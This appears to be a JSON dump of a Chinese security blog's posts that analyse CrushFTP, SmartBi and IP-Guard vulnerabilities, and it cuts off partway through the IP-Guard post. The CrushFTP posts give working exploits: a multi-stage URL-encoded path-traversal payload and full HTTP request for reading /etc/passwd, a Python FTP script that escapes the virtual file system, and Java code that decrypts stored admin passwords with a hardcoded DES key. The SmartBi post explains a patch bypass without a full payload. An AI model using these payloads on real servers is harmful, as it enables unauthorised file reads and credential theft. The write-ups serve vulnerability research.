只要能让项目报错就能保存日志，因此我们可以访问一个不存在的路由触发日志即可将payload写入(注意处理空格的问题，#符号也要替换，闭合语句即可)","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"}]},{"title":"CrushFTP后利用提权分析(CVE-2024-4040)","slug":"year/2024/4/CrushFTP后利用提权分析-CVE-2024-4040","date":"2024-04-25T11:49:41.000Z","updated":"2024-04-25T13:57:12.000Z","comments":true,"path":"2024/04/25/year/2024/4/CrushFTP后利用提权分析-CVE-2024-4040/","link":"","permalink":"https://y4tacker.github.io/2024/04/25/year/2024/4/CrushFTP%E5%90%8E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90-CVE-2024-4040/","excerpt":"","text":"CrushFTP后利用提权分析(CVE-2024-4040)写在前面这个漏洞的利用最终还是被曝光了，这里也不做重复的分析，具体可以点击访问CVE-2024-4040了解漏洞的详情，在这里作者在分析利用的时候仍然使用的sessions.obj文件去读取历史cookie再做提权的尝试，但在最早的一篇文章当中我也曾提到过，只有在程序退出时才会生成这样一个文件，它充当了服务器的一个缓存功能(CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177))，因此它的利用相对来说更为玄学，一切看命，在实战中我们往往更需要一些更稳定直接的方式来获取admin账户的密码。 后利用获取用户配置文件路径在之前我提到过，这个系统对于用户配置的保存是在XML文件中做了保存，如下所示 它的相对路径在/users/MainUsers下 另外在漏洞作者的分析当中，提到可以使用&#123;working_dir&#125;来获取项目运行的绝对路径 123456GET /WebInterface/function/?command=zip&amp;c2f=rsC2&amp;path=&#123;working_dir&#125;&amp;names=/bbb HTTP/1.1Host: 127.0.0.1:8080Cookie: CrushAuth=1714046327401_GY8KgRYG9W7GRoulsigqE3V2eKrsC2; Content-Type: application/x-www-form-urlencoded 因此结合以上两点我们很容易能得到具体的用户的配置文件 path=&lt;INCLUDE&gt;&#123;working_dir&#125;users/MainUsers/username/user.XML&lt;/INCLUDE&gt; 当然其实使用相对路径也可以path=&lt;INCLUDE&gt;./users/MainUsers/username/user.XML&lt;/INCLUDE&gt; 因此我们只需要知道admin用户的用户名即可得到相对应的配置文件 同时通过配置文件的内容，我们可以看到密码也是被加密存储在了这个文件当中 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;userfile type=&quot;properties&quot;&gt; &lt;real_path_to_user&gt;./users/MainUsers/y4tacker/&lt;/real_path_to_user&gt; &lt;updated_time&gt;1713866209446&lt;/updated_time&gt; &lt;created_time&gt;1713794508983&lt;/created_time&gt; &lt;root_dir&gt;/&lt;/root_dir&gt; &lt;user_name&gt;y4tacker&lt;/user_name&gt; &lt;max_logins&gt;0&lt;/max_logins&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;last_logins&gt;04/25/2024 07:33:47 PM,04/25/2024 11:03:37 AM,04/25/2024 10:11:22 AM,04/25/2024 09:55:49 AM,04/24/2024 12:34:08 AM,04/24/2024 12:26:34 AM,04/23/2024 11:39:33 PM,04/23/2024 11:15:06 PM,04/23/2024 05:57:00 PM,04/23/2024 10:40:08 AM&lt;/last_logins&gt; &lt;updated_by_username&gt;crushadmin&lt;/updated_by_username&gt; &lt;password&gt;71W4Y3ZzpxXfeaU4fehf/w==&lt;/password&gt; &lt;created_by_username&gt;crushadmin&lt;/created_by_username&gt; &lt;userVersion&gt;6&lt;/userVersion&gt; &lt;updated_by_email&gt;&lt;/updated_by_email&gt; &lt;configure_reverse_share_events&gt;true&lt;/configure_reverse_share_events&gt; &lt;username&gt;y4tacker&lt;/username&gt;&lt;/userfile&gt; 这时候又会面临另一个问题，尽管我们知道存在一个名为crushadmin的管理员，但是如果这个账号被删了改成了其他的名字我们又该如何下手呢? 柳暗花明又一村解决方法其实也很简单，这个系统会将用户的信息保存到logs/session_logs文件夹下 查看目录我们不难发现，命名方式也非常有规律24(年)04(月)25(日)20(时) 再往下一级目录看，命名方式固定session_HTTP_num.log 再来看看具体内容，不难发现在日志当中，详细记录了我们的用户名以及一些操作信息，这时候用户名的问题也就迎刃而解 破解加密的密码我们以y4tacker用户为例，这里加密的密码为71W4Y3ZzpxXfeaU4fehf/w== 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;userfile type=&quot;properties&quot;&gt; &lt;real_path_to_user&gt;./users/MainUsers/y4tacker/&lt;/real_path_to_user&gt; &lt;updated_time&gt;1713866209446&lt;/updated_time&gt; &lt;created_time&gt;1713794508983&lt;/created_time&gt; &lt;root_dir&gt;/&lt;/root_dir&gt; &lt;user_name&gt;y4tacker&lt;/user_name&gt; &lt;max_logins&gt;0&lt;/max_logins&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;last_logins&gt;04/25/2024 07:33:47 PM,04/25/2024 11:03:37 AM,04/25/2024 10:11:22 AM,04/25/2024 09:55:49 AM,04/24/2024 12:34:08 AM,04/24/2024 12:26:34 AM,04/23/2024 11:39:33 PM,04/23/2024 11:15:06 PM,04/23/2024 05:57:00 PM,04/23/2024 10:40:08 AM&lt;/last_logins&gt; &lt;updated_by_username&gt;crushadmin&lt;/updated_by_username&gt; &lt;password&gt;71W4Y3ZzpxXfeaU4fehf/w==&lt;/password&gt; &lt;created_by_username&gt;crushadmin&lt;/created_by_username&gt; &lt;userVersion&gt;6&lt;/userVersion&gt; &lt;updated_by_email&gt;&lt;/updated_by_email&gt; &lt;configure_reverse_share_events&gt;true&lt;/configure_reverse_share_events&gt; &lt;username&gt;y4tacker&lt;/username&gt;&lt;/userfile&gt; 接下来我们只需要去看看系统是如何处理解密即可 通过查看登录流程对这坨屎山系统的不断查找，最终不难发现对密码的解密处理在crushftp.handlers.Common#decode_pass 123456789101112131415161718192021222324252627282930313233343536373839404142# 以下仅仅列出关键代码public String decode_pass(String raw) &#123; DesEncrypter crypt = new DesEncrypter(new String(com.crushftp.client.Common.encryption_password), base64Decode); String s = crypt.decrypt(raw); if (s == null) &#123; crypt = new DesEncrypter(new String(com.crushftp.client.Common.encryption_password), false); s = crypt.decrypt(raw); &#125; if (s == null) &#123; s = decode_pass3(raw); &#125; return s;&#125;........DesEncrypter.class........public DesEncrypter(String key, boolean base64) &#123; try &#123; ServerStatus var10005 = ServerStatus.thisObj; key = Common.getHash(key, base64, &quot;SHA&quot;, &quot;&quot;, &quot;&quot;, ServerStatus.BG(&quot;sha3_keccak&quot;)); this.doInit(key); &#125; catch (Exception var4) &#123; &#125;&#125;public void doInit(String key) throws Exception &#123; while((float)key.length() / 8.0F != (float)(key.length() / 8)) &#123; key = key + &quot;Z&quot;; &#125; DESKeySpec desKeySpec = new DESKeySpec(key.getBytes()); SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;DES&quot;); SecretKey secretKey = keyFactory.generateSecret(desKeySpec); this.ecipher = Cipher.getInstance(&quot;DES&quot;); this.dcipher = Cipher.getInstance(&quot;DES&quot;); this.ecipher.init(1, secretKey); this.dcipher.init(2, secretKey);&#125; 我们可以看到这个com.crushftp.client.Common.encryption_password也是硬编码存储在程序当中，因此我们能很容易计算出这个初始化的key 简单编写一个解密脚本 123456789String key = getHash(&quot;crushftp&quot;, true, &quot;SHA&quot;, &quot;&quot;, &quot;&quot;, false);Cipher dcipher = Cipher.getInstance(&quot;DES&quot;);DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;DES&quot;);SecretKey secretKey = keyFactory.generateSecret(desKeySpec);dcipher.init(2,secretKey);byte[] dec = Base64.decode(&quot;71W4Y3ZzpxXfeaU4fehf/w==&quot;);byte[] utf8 = dcipher.doFinal(dec);System.out.println(new String(utf8)); 运行后成功得到密码为y4tacker 因此我们便能通过遍历日志提取所有的用户名，再读取解密密码即可获得所有用户的用户名密码登录","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"}]},{"title":"浅析CrushFTP之VFS逃逸","slug":"year/2024/4/浅析CrushFTP之VFS逃逸","date":"2024-04-23T14:56:38.000Z","updated":"2024-04-23T16:34:30.000Z","comments":true,"path":"2024/04/23/year/2024/4/浅析CrushFTP之VFS逃逸/","link":"","permalink":"https://y4tacker.github.io/2024/04/23/year/2024/4/%E6%B5%85%E6%9E%90CrushFTP%E4%B9%8BVFS%E9%80%83%E9%80%B8/","excerpt":"","text":"浅析CrushFTP之VFS逃逸写在前面本篇的内容可能并不是最新的漏洞(毕竟我也没最新版代码)，是去年十一月份更新的漏洞，只是当时由于各种各样的项目导致分析被搁置了许久，再次关注它则是因为看到出了新的安全公告，又想起来当时并未分析完全，于是接着之前的工作继续研究（当然另一方面是因为没有各个版本的代码所以不想看最新版的漏洞，另外漏洞的描述中也并不能让我看出什么） 再次回顾，从描述中可以看到，漏洞利用的一部分是知道admin的用户名，另一部分是使用低权限账号(或者系统开启了匿名访问)逃逸原本的VFS(虚拟文件系统)读取任意文件，最终能做到一个提权的效果 至于为什么？则是因为这个系统的配置包括用户名、密码以及一些硬编码密钥其实都是通过XML文件的形式做保存 用户信息则是保存在users/MainUsers/xxx目录下，因此如果我们能做到任意文件的读取，那么毫无疑问，我们便能解密admin用户的信息成功实现提权 漏洞分析HTTP的利用因为这套系统支持很多种访问方式，如HTTP、FTP等，这里我们以HTTP的利用为例(主要是更有趣一点) 关于路由等的信息其实早在上一篇文章当中我就曾提到 CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177) 从上图可以简单看出，这里自己实现了协议的解析并做调用，写法比较死板，不够灵活（具体过程可以在crushftp.server.ServerSessionHTTP看到具体的处理过程)，因此鉴于它看着实在让人受折磨，这里也并不打算带大家一行一行看代码，我们主要分享一些关键的有趣的思路 首先我们假设拥有一个低权限的账号(或者支持匿名访问的情况下就不需要了)，并且拥有部分文件读取的权限 对于某个共享文件的访问，其实就是直接通过URL+文件的形式做访问 在这时候我们第一个能想到的思路就是会不会存在直接的路径穿越/Desktop/../../../../../etc/passwd，当然在这里直接这样访问是不行的，具体和程序处理逻辑相关 对应的文件访问功能在代码当中则是从1532行开始(我的版本是10.5)，有兴趣自己读一读 先是对路径通过dots函数做处理 12345678public static String dots(String s) &#123; boolean uncFix = s.indexOf(&quot;:////&quot;) &gt; 0; s = s.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;); for(String s2 = &quot;&quot;; s.indexOf(&quot;%&quot;) &gt;= 0 &amp;&amp; !s.equals(s2); s = s.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;)) &#123; s2 = s; s = url_decode(s); &#125; 可以看到他对路径做了一些处理，关于unc的路径处理我们这里也不看了没多大用途，其余部分的处理则是 多次对路径做url解码，直到完全解码(解码的内容等于解码前的内容则认为不需要继续解码) 如果路径以../开头则去除../的部分，如果路径以..结尾则对路径末尾补充/ 如果路径中存在../或./则对其做路径归一化的处理，最后去除收尾的../以及/. 如果路径中存在!!!以及(且要求!!!在之前)，在路径中存在/时，按/做分段处理，分别遍历删除其中的!!!以及~ 返回处理好的字符串 在这里我们不难想到，我们完全可以通过构造/.!!!~./etc/passwd来实现对路径的穿越，但要是仅仅如此那这个漏洞就缺乏了一些趣味 接下来如果不是以/WebInterface/function开头的路由则会调用到cd函数设置对应的路径信息，可以看到这里又调用Common.dots做了一次处理，到这里也就是两次了 12345Common.dotsCommon.dots(user_dir); this.http_dir = user_dir; this.thisSession.uiPUT(&quot;current_dir&quot;, user_dir);&#125; 别急还没完最终在读取文件的时候，它又调用了this.fixPath(path);对路径做了处理，到这里也就是连续使用三次dots函数做了路径处理操作 12345678910111213public String fixPath(String path) &#123; path = Common.dots(path); if (path.toUpperCase().startsWith(&quot;FILE:&quot;) || path.indexOf(&quot;:&quot;) == 1 || path.indexOf(&quot;:&quot;) == 2) &#123; path = crushftp.handlers.Common.replace_str(path, &quot;:\\\\&quot;, &quot;/&quot;); path = crushftp.handlers.Common.replace_str(path, &quot;:/&quot;, &quot;/&quot;); &#125; if (path.startsWith(&quot;/&quot;)) &#123; path = path.substring(1); &#125; return path;&#125; 如果仅仅只是看代码表面，第一眼你可能会觉得完了，似乎并不能绕过？在这里推荐大家自己仔细思考下看看能不能发现一些端倪 破局在这里我就直接公布答案了，破局点在这个url解码的过程，刚刚说到了他会多次调用urldecode解码字符串，直到解码后的内容与解码前的内容一致则认为不需要继续解码了 1234for(String s2 = &quot;&quot;; s.indexOf(&quot;%&quot;) &gt;= 0 &amp;&amp; !s.equals(s2); s = s.replace(&#x27;\\\\&#x27;, &#x27;/&#x27;)) &#123; s2 = s; s = url_decode(s);&#125; 而这里问题的关键则在于这个解码函数，他理所当然的认为了jdk自带的解码库一定不会抛出异常，因此如果我们能让解码过程报错，那么就会返回这个字符 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293public static String url_decode(String s) &#123; try &#123; if (s.indexOf(&quot;% &quot;) &lt; 0 &amp;&amp; !s.endsWith(&quot;%&quot;)) &#123; String s2 = s.replace(&#x27;+&#x27;, &#x27;þ&#x27;); s2 = URLDecoder.decode(s2, &quot;UTF8&quot;); s = s2.replace(&#x27;þ&#x27;, &#x27;+&#x27;); &#125; &#125; catch (Exception var2) &#123; log(&quot;SERVER&quot;, 2, (Exception)var2); &#125; for(int x = 0; s != null &amp;&amp; x &lt; 32; ++x) &#123; if (x &lt; 9 || x &gt; 13) &#123; s = s.replace((char)x, &#x27;_&#x27;); &#125; &#125; return s;&#125;public static String decode(String s, Charset charset) &#123; Objects.requireNonNull(charset, &quot;Charset&quot;); boolean needToChange = false; int numChars = s.length(); StringBuilder sb = new StringBuilder(numChars &gt; 500 ? numChars / 2 : numChars); int i = 0; char c; byte[] bytes = null; while (i &lt; numChars) &#123; c = s.charAt(i); switch (c) &#123; case &#x27;+&#x27;: sb.append(&#x27; &#x27;); i++; needToChange = true; break; case &#x27;%&#x27;: /* * Starting with this instance of %, process all * consecutive substrings of the form %xy. Each * substring %xy will yield a byte. Convert all * consecutive bytes obtained this way to whatever * character(s) they represent in the provided * encoding. */ try &#123; // (numChars-i)/3 is an upper bound for the number // of remaining bytes if (bytes == null) bytes = new byte[(numChars-i)/3]; int pos = 0; while ( ((i+2) &lt; numChars) &amp;&amp; (c==&#x27;%&#x27;)) &#123; int v = Integer.parseInt(s, i + 1, i + 3, 16); if (v &lt; 0) throw new IllegalArgumentException( &quot;URLDecoder: Illegal hex characters in escape &quot; + &quot;(%) pattern - negative value&quot;); bytes[pos++] = (byte) v; i+= 3; if (i &lt; numChars) c = s.charAt(i); &#125; // A trailing, incomplete byte encoding such as // &quot;%x&quot; will cause an exception to be thrown if ((i &lt; numChars) &amp;&amp; (c==&#x27;%&#x27;)) throw new IllegalArgumentException( &quot;URLDecoder: Incomplete trailing escape (%) pattern&quot;); sb.append(new String(bytes, 0, pos, charset)); &#125; catch (NumberFormatException e) &#123; throw new IllegalArgumentException( &quot;URLDecoder: Illegal hex characters in escape (%) pattern - &quot; + e.getMessage()); &#125; needToChange = true; break; default: sb.append(c); i++; break; &#125; &#125; return (needToChange? sb.toString() : s);&#125; 在这里就不带大家一行一行解读了，主要是太晚了还要睡觉呢，这里直接公布答案，大家自己仔细看看 在这里我们访问(Desktop是任意可访问的文件夹或文件) 1/Desktop/HackedByY4%/!!!~.!!!~./%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 第一次路径处理: url解码出错(%/.无法解码)直接返回原字符，之后会删除！！！~ 此时payload变成了 1/Desktop/HackedByY4%/../%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 第二次路径处理： url解码出错直接返回原字符，之后遇到../做路径归一化后 此时payload变成了 1/Desktop/%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 第三次路径处理: url成功解码，此时payload为 1/Desktop//..!!!~/..!!!~/..!!!~/..!!!~/..!!!~/..!!!~/etc/passwd 之后会删除！！！~，成功恢复为我们要读取的文件，这里由于/Desktop文件存在读取权限，因此通过目录穿越我们最终也就实现了对/etc/passwd的读取，实现了对VFS的逃逸 1/Desktop/../../../../../etc/passwd 测试payload 12345678GET /Desktop/HackedByY4%/!!!~.!!!~./%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%2e%2e%21%21%21%7e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0Content-Type: application/x-www-form-urlencodedConnection: closeCookie:csrftoken=4sAZX2pHaNF9RyoEHb7KENFQhia3jntA; currentAuth=BIGS; CrushAuth=1713889594438_uQ1LVPWPBAYQSHLZrtUV4uzR1yBIGSContent-Length: 77 成功实现了对/etc/passwd文件的读取 接下来的后利用就是读取admin的账户密码做解密登陆后台实现越权了 FTP的利用本来想写一下的但是太晚了，乏了索性就睡了，ftp的利用方式则更简单，他没有多次的路径处理，仅仅只有一次，这里我直接给出脚本，留个小作业，有兴趣的朋友可以在知识星期对FTP的利用做分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445from ftplib import FTP# 远程ftp服务器的地址和端口号host = &#x27;127.0.0.1&#x27;port = 21# 登录用户名和密码username = &#x27;y4tacker&#x27;password = &#x27;y4tacker&#x27;# 连接远程ftp服务器ftp = FTP()ftp.connect(host, port)# 登录ftp.login(username, password)# 列出远程ftp服务器上的文件def list_files(): files = [] ftp.retrlines(&#x27;LIST&#x27;, files.append) for file in files: print(file)# 下载远程ftp服务器上的文件def download_file(remote_file, local_file): with open(local_file, &#x27;wb&#x27;) as f: ftp.retrbinary(&#x27;RETR &#x27; + remote_file, f.write)# 列出远程ftp服务器上的文件# list_files()def list_files_in_dir(dir): files = ftp.nlst(dir) for file in files: print(file)ftp.cwd(&quot;Desktop&quot;)# list_files_in_dir(&quot;../../../&quot;)# # 下载远程ftp服务器上的文件download_file(&#x27;..!!!~/..!!!~/..!!!~/etc/hostsz&#x27;, &#x27;local_file.txt&#x27;)## # 关闭ftp连接ftp.quit() 睡了睡了~~~","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"}]},{"title":"浅析SmartBi逻辑漏洞(3)","slug":"year/2024/4/浅析SmartBi逻辑漏洞-3","date":"2024-04-19T02:10:30.000Z","updated":"2024-04-19T05:33:54.000Z","comments":true,"path":"2024/04/19/year/2024/4/浅析SmartBi逻辑漏洞-3/","link":"","permalink":"https://y4tacker.github.io/2024/04/19/year/2024/4/%E6%B5%85%E6%9E%90SmartBi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-3/","excerpt":"","text":"浅析SmartBi逻辑漏洞(3)前言这个系列终于到了第三篇，指条路，如果忘记了可以再看看之前写的文章 浅析Smartbi逻辑漏洞 浅析Smartbi逻辑漏洞(2) 之前我就曾在第二篇末尾提到过（没人继续深入看），仍然存在一个问题，今天这个问题终于得以修复 当然老规矩，这里仅分享逻辑漏洞部分补丁绕过思路，不提供完整payload 补丁补丁中新增了一个规则 12345&quot;rules&quot;: [&#123; &quot;className&quot;: &quot;*&quot;, &quot;methodName&quot;: &quot;*&quot;, &quot;type&quot;: &quot;RejectGetAndFormData&quot;&#125; 一眼丁真，鉴定为不能同时使用GET与Multipart 12345678910111213141516171819202122232425262728protected int patchRMI(String className, String methodName, HttpServletRequest request, HttpServletResponse response, FilterChain chain) &#123; String contentType = request.getContentType(); if (this.isNullOrEmpty(contentType)) &#123; contentType = &quot;&quot;; &#125; String method = request.getMethod(); if (this.isNullOrEmpty(method)) &#123; method = &quot;&quot;; &#125; if (&quot;get&quot;.equals(method.toLowerCase(Locale.ENGLISH)) &amp;&amp; contentType.toLowerCase(Locale.ENGLISH).startsWith(&quot;multipart/form-data&quot;)) &#123; return 1; &#125; else &#123; String params = request.getParameter(&quot;params&quot;); if (params == null) &#123; params = (String)request.getAttribute(&quot;params&quot;); &#125; if (this.isNotNullAndEmpty(className) &amp;&amp; this.isNotNullAndEmpty(methodName) &amp;&amp; this.isNotNullAndEmpty(params)) &#123; request.setAttribute(&quot;className&quot;, className); request.setAttribute(&quot;methodName&quot;, methodName); request.setAttribute(&quot;params&quot;, params); &#125; return 0; &#125;&#125; 利用分析其实这个有两种打法，因为两个版本代码不一样，这里我们以V9代码为例 简单做个回顾(详细的自己看老版本分析)，当我们调用RMIServlet之前需要绕过CheckIsLoggedFilter的判断，保证在CheckIsLoggedFilter中指向的类与方法在白名单当中，而在RMIServlet实际调用时指向真正要执行黑名单方法 接下来回到CheckIsLoggedFilter,如果我们请求是GET方法，之后就会通过httpRequest.getParameter获取我们的className\\methodName\\encode参数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374boolean isRmi = &quot;/vision/RMIServlet&quot;.equals(((HttpServletRequest)httpRequest).getServletPath()); String requestStr; if (isRmi) &#123; String queryString = ((HttpServletRequest)httpRequest).getQueryString(); String params; if (queryString != null &amp;&amp; queryString.startsWith(&quot;windowUnloading&quot;)) &#123; params = queryString.length() &gt; &quot;windowUnloading&quot;.length() &amp;&amp; queryString.charAt(&quot;windowUnloading&quot;.length()) == &#x27;=&#x27; ? &quot;windowUnloading=&amp;&quot; : &quot;windowUnloading&amp;&quot;; .......此处省略....... &#125; else if (&quot;GET&quot;.equals(((HttpServletRequest)httpRequest).getMethod())) &#123; className = ((HttpServletRequest)httpRequest).getParameter(&quot;className&quot;); methodName = ((HttpServletRequest)httpRequest).getParameter(&quot;methodName&quot;); encode = ((HttpServletRequest)httpRequest).getParameter(&quot;encode&quot;); &#125; if (encode != null &amp;&amp; className == null &amp;&amp; methodName == null) &#123; String[] decode = RMICoder.decode(encode); className = decode[0]; methodName = decode[1]; params = decode[2]; ((HttpServletRequest)httpRequest).setAttribute(&quot;className&quot;, className); ((HttpServletRequest)httpRequest).setAttribute(&quot;methodName&quot;, methodName); ((HttpServletRequest)httpRequest).setAttribute(&quot;params&quot;, params); ((HttpServletRequest)httpRequest).setAttribute(&quot;request_encoded&quot;, Boolean.TRUE); &#125; if (className == null &amp;&amp; methodName == null &amp;&amp; (((HttpServletRequest)httpRequest).getContentType() == null || !((HttpServletRequest)httpRequest).getContentType().startsWith(&quot;multipart/form-data;&quot;))) &#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buff = new byte[4096]; InputStream is = ((HttpServletRequest)httpRequest).getInputStream(); int readed; while((readed = is.read(buff)) &gt;= 0) &#123; baos.write(buff, 0, readed); &#125; requestStr = baos.toString(&quot;UTF-8&quot;); String[] requestParams = requestStr.split(&quot;\\\\&amp;&quot;); String encodeValue = null; String[] decode = requestParams; int var19 = requestParams.length; for(int var20 = 0; var20 &lt; var19; ++var20) &#123; String param = decode[var20]; int index = param.indexOf(61); if (index != -1) &#123; String key = param.substring(0, index); String value = param.substring(index + 1); value = URLDecoder.decode(value, &quot;UTF-8&quot;); if (encodeValue == null &amp;&amp; &quot;encode&quot;.equals(key)) &#123; encodeValue = value; &#125; ((HttpServletRequest)httpRequest).setAttribute(key, value); &#125; &#125; className = (String)((HttpServletRequest)httpRequest).getAttribute(&quot;className&quot;); methodName = (String)((HttpServletRequest)httpRequest).getAttribute(&quot;methodName&quot;); if (className == null &amp;&amp; methodName == null &amp;&amp; encodeValue != null) &#123; decode = RMICoder.decode(encodeValue); className = decode[0]; methodName = decode[1]; String params = decode[2]; ((HttpServletRequest)httpRequest).setAttribute(&quot;className&quot;, className); ((HttpServletRequest)httpRequest).setAttribute(&quot;methodName&quot;, methodName); ((HttpServletRequest)httpRequest).setAttribute(&quot;params&quot;, params); ((HttpServletRequest)httpRequest).setAttribute(&quot;request_encoded&quot;, Boolean.TRUE); &#125; if (LOG.isTraceEnabled()) &#123; LOG.trace(&quot;Get parameter &#x27;className&#x27; return null. Parse request.getInputStream() result:&quot; + className + &quot;.&quot; + methodName); &#125; &#125; &#125; 接下来我们再来回顾RMIServlet中对参数的获取(smartbi.util.RMIUtil#parseRMIInfo(javax.servlet.http.HttpServletRequest, boolean)) 首先尝试通过request.getParameter尝试获取className\\methodName\\params参数，如果为空则通过自定义实现的Multipart做解析获取 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123; if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123; return null; &#125; else &#123; RMIInfo info = getRMIInfoFromRequest(request); if (info != null) &#123; return info; &#125; else &#123; String className = request.getParameter(&quot;className&quot;); String methodName = request.getParameter(&quot;methodName&quot;); String params = request.getParameter(&quot;params&quot;); if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123; DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try &#123; List&lt;FileItem&gt; fileItems = upload.parseRequest(request); request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems); Iterator var10 = fileItems.iterator(); while(var10.hasNext()) &#123; FileItem fileItem = (FileItem)var10.next(); if (fileItem.isFormField()) &#123; String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(&quot;UTF-8&quot;); if (&quot;className&quot;.equals(itemName)) &#123; className = itemValue; &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123; methodName = itemValue; &#125; else if (&quot;params&quot;.equals(itemName)) &#123; params = itemValue; &#125; else if (&quot;encode&quot;.equals(itemName)) &#123; encodeString = itemValue; &#125; &#125; &#125; &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123; LOG.error(var14.getMessage(), var14); &#125; if (!StringUtil.isNullOrEmpty(encodeString)) &#123; String[] decode = (String[])((String[])CodeEntry.decode(encodeString, true)); className = decode[0]; methodName = decode[1]; params = decode[2]; &#125; &#125; if (className == null &amp;&amp; methodName == null) &#123; className = (String)request.getAttribute(&quot;className&quot;); methodName = (String)request.getAttribute(&quot;methodName&quot;); params = (String)request.getAttribute(&quot;params&quot;); &#125; info = new RMIInfo(); info.setClassName(className); info.setMethodName(methodName); info.setParams(params); request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info); return info; &#125; &#125;&#125; 看完以后，聪明的同学已经能想到一个解析差异的问题 如果我们将请求方法设置为GET,在queryString中仅传入encode参数(白名单类方法)，再将真实要执行的放在Multipart部分不就能绕过Filter的校验了么 将以上带入执行流程做个简单梳理： —–Filter—— 请求方法为GET、获取参数className(空)\\methodName(空)\\encode(非空) 由于className与methodName为空，通过RMICoder解码内容为其赋值 判断类与方法名在白名单中，Filter校验通过 —–Servlet—- 通过request.getParameter未获取到类、方法以及参数 判断Header的Content-Type头存在multipart/form-data; 解析Body，获取到真实执行的类、方法以及参数，最终完成调用 因此V9系统下的分析就完成了，补个利用截图(V9) 当然其实在V11当中这个解析也有一定差异 在V11系统当中不能通过encode+multipart的组合姿势完成绕过 就当是留个小作业吧，V11当中到底有什么差异呢？又该如何构造绕过的Payload呢？利用截图(V11)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"}]},{"title":"IP-Guard权限绕过浅析","slug":"year/2024/4/IP-Guard权限绕过浅析","date":"2024-04-17T01:39:31.000Z","updated":"2024-04-20T06:06:28.000Z","comments":true,"path":"2024/04/17/year/2024/4/IP-Guard权限绕过浅析/","link":"","permalink":"https://y4tacker.github.io/2024/04/17/year/2024/4/IP-Guard%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/","excerpt":"","text":"IP-Guard权限绕过浅析比较适合新手学习的一个审计案例，代码简单无阅读障碍 权限绕过IP-Guard采用CodeIgniter框架二次开发，从微步情报看作用仅是”可以绕过权限验证，调用后台接口进行任意文件读取、删除。攻击者可利用该漏洞读取数据库配置信息，进而接管数据库” 通常来说，CodeIgniter中的鉴权通常是在控制器中的构造函数中 因为代码不多，最后可以发现涉及文件读写的在mApplyList#downloadFile_client 再来看看构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596public function __construct()&#123; parent::__construct(); 